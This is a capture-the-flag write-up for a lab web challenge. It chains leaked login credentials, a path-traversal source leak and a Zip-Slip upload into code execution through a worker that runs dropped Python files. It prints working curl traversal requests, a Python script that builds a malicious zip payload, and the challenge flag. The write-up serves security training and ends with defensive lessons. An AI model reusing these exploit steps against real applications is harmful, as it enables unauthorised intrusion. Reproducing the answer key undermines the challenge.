# Day 10 — The Hollow Shell

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed (2026-08-05)
- **Target:** `http://<machine-ip>:5000/` — a Flask app, **"Shoreline Display"**, the Byte Lotus staff portal for publishing in-room "shells" (zip souvenir packs of shoreline ambiance). SSH also open on `22/tcp`.
- **Category:** Web (Medium, 90 pts) — file upload · Zip-Slip · path-traversal LFI · async job runner → RCE
- **Objective:** _"Slip past what the portal forgets to check, and the shell answers with a shell of your own."_ Get code execution and read the flag.
- **Story hook:** _"You find it on the beach... Slip something inside and hold it to your ear."_ Guests personalise the in-room tablets by uploading a **shell** (a `.zip` containing a `shell.json` manifest). Staff publish them; once a shell is _"held to the room's ear it plays its shore."_ A shell may include optional **"automation hooks — the theme worker applies these for you shortly after."** Answer format `THM{...}`.
- **Vulnerability:** **Zip-Slip (unsanitised zip entry paths) → arbitrary file write, combined with an out-of-band "theme worker" that executes any `*.py` dropped in a hooks directory.** A second bug — an **unvalidated `shell_id` in the asset route** — gives a path-traversal **source-disclosure LFI** that hands you the app + worker source. The manifest `hooks` field is a **red herring**: the web app never runs it.
- **Attack path (summary):**
  1. **Leaked creds (recon):** the login page HTML source contains a commented "starter login" — `concierge` / `StayNoticed2024!`. Sign in.
  2. **Map the app:** only `/login`, `/dashboard`, `/upload`, `/logout`, plus asset serving at `/shells/<id>/<file>`. Upload accepts a `.zip` with a `shell.json` manifest (`name` required; declared `assets` are extension-checked against `png jpg gif svg css json`).
  3. **Zip-Slip write:** the extractor does `os.path.join(shell_dir, name)` over **raw zip entry names with no `../` check**, and `os.makedirs` the parent. A zip entry named `../../static/x` lands in the app root's `static/` (served) — confirming **arbitrary file write** anywhere the app user can reach, including creation of missing dirs.
  4. **What DOESN'T work (dead ends):** uploaded `.py` is served as text (no execution); manifest `hooks`/`command` strings never run (worker isn't the web app); template overwrite doesn't reflect (Jinja caches, `debug=False`, no reloader); zip **symlinks aren't honoured** (written as plain files); SSH key write fails (app user has no login shell); the hardcoded `secret_key` is real but useless (auth only checks `staff == "concierge"`, which you already are).
  5. **Source-disclosure LFI (the unlock):** the asset route `/shells/<shell_id>/<path:asset>` never validates `shell_id`. Encoded traversal `GET /shells/..%2fapp.py` resolves `shell_id=".."` → `send_from_directory(BASE_DIR, "app.py")` and **returns the source**. Reading `app.py` reveals `HOOKS_DIR = BASE_DIR/hooks` (created, never used by the web app) → there's a **separate worker**. Reading `theme_worker.py` shows it **polls `hooks/*.py` every 20s and pipes each file into `python -`** = arbitrary code execution.
  6. **Zip-Slip → hooks/ → RCE:** upload a zip whose entry name is `../../hooks/pwn.py` (resolves to `BASE_DIR/hooks/pwn.py`). Within ~20s the worker runs it as `uid=996(roomservice)`.
  7. **Exfil (no egress):** the box has **no outbound internet**, so reverse shells / `curl` callbacks silently fail. Instead the payload finds the app dir, hunts the flag, and writes output into a **web-served** `shells/pwn/out.txt`, which you read back over HTTP.
  8. **Flag:** `find / -iname 'flag*'` → `/home/roomservice/flag.txt`.
- **Flag:** <details><summary>click to reveal</summary><code>THM{z1p_sl1pp3d_1nt0_a_sh3ll}</code></details> — a pun on **Zip-Slip** landing you a **shell**.
- **Lessons:**
  - **Never trust zip entry names** — validate/normalise every path and reject anything that escapes the target dir (`..`, absolute paths, symlinks). Prefer `zipfile` with an explicit `safe_join`/`os.path.realpath` containment check, not raw `os.path.join`.
  - **Validate identifiers used in file paths** — `shell_id` flowed straight into `os.path.join` with no `^[0-9a-f]{12}$` check, turning the asset route into an LFI. `send_from_directory` only protects the `<asset>` segment, not the directory you hand it.
  - **Don't build a "trusted" async executor that runs arbitrary code from a shared, writable directory** — the theme worker ran any `*.py` in `hooks/`, so one arbitrary-write bug became full RCE.
  - **Extension allow-lists on *declared* assets are meaningless if you extract *every* entry anyway** — the manifest checked declared asset types, but `extract_shell` wrote the whole `namelist()`.
  - **Defence-in-depth mattered here:** even with no egress and a nologin service account, source disclosure + local file write was enough. Least-privilege the worker, sandbox it, and don't co-locate a web-writable dir with a code runner.

## Walkthrough

```bash
IP=<machine-ip>

# 0) creds are in the login page HTML comment: concierge / StayNoticed2024!
curl -s -c cookies.txt -o /dev/null \
  -d 'username=concierge&password=StayNoticed2024!' http://$IP:5000/login

# 1) source-disclosure LFI via unvalidated shell_id (%2f = '/')
curl -s -g --path-as-is "http://$IP:5000/shells/..%2fapp.py"          # app source
curl -s -g --path-as-is "http://$IP:5000/shells/..%2ftheme_worker.py" # runs hooks/*.py via `python -` every 20s

# 2) build a shell that Zip-Slips a python hook into BASE_DIR/hooks/
python3 - <<'PY'
import zipfile, json
payload = r'''import subprocess
subprocess.run(r"""
d=$(dirname "$(find / -name theme_worker.py 2>/dev/null | head -1)")
mkdir -p "$d/shells/pwn"
{
  echo "id: $(id)"; echo "host: $(hostname)"
  find / -iname 'flag*' -type f 2>/dev/null
  for f in $(find / -iname 'flag*' -type f 2>/dev/null | head -20); do echo "== $f =="; cat "$f" 2>/dev/null; done
} > "$d/shells/pwn/out.txt" 2>&1
chmod -R 755 "$d/shells/pwn"
""", shell=True, executable="/bin/bash")
'''
with zipfile.ZipFile('hook.zip','w') as z:
    z.writestr('shell.json', json.dumps({"name":"x","assets":[]}))
    z.writestr('../../hooks/pwn.py', payload)   # -> BASE_DIR/hooks/pwn.py
print("built hook.zip")
PY

# 3) upload hook.zip via the dashboard, wait ~30-40s (worker polls every 20s)

# 4) read the exfil'd output back over HTTP (no egress needed)
curl -s "http://$IP:5000/shells/pwn/out.txt"
# ... == /home/roomservice/flag.txt ==
# THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Key facts

| Item | Value |
| ---- | ----- |
| Target | `http://<machine-ip>:5000/` (Flask + gunicorn) · SSH on `22` |
| Creds | `concierge` / `StayNoticed2024!` (HTML comment on `/login`) |
| Upload | `POST /upload`, field `shell` = `.zip` with `shell.json` (`name` required) |
| Bug #1 | **Zip-Slip** in `extract_shell()` — raw `os.path.join(shell_dir, name)`, `makedirs`, no `..` check |
| Bug #2 | **LFI** — `shell_id` unvalidated in `/shells/<shell_id>/<asset>` → `/shells/..%2fapp.py` |
| Executor | `theme_worker.py` polls `BASE_DIR/hooks/*.py` every 20s, runs via `python -` |
| RCE payload | zip entry `../../hooks/pwn.py` → `BASE_DIR/hooks/pwn.py` |
| Exec context | `uid=996(roomservice)` on `tryhackme-2404`; **no outbound egress** |
| Exfil | payload writes `BASE_DIR/shells/pwn/out.txt` → read at `/shells/pwn/out.txt` |
| Flag location | `/home/roomservice/flag.txt` |
| Red herrings | manifest `hooks` field, template overwrite, symlinks-in-zip, SSH key write, cookie forgery |
| Flag | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |
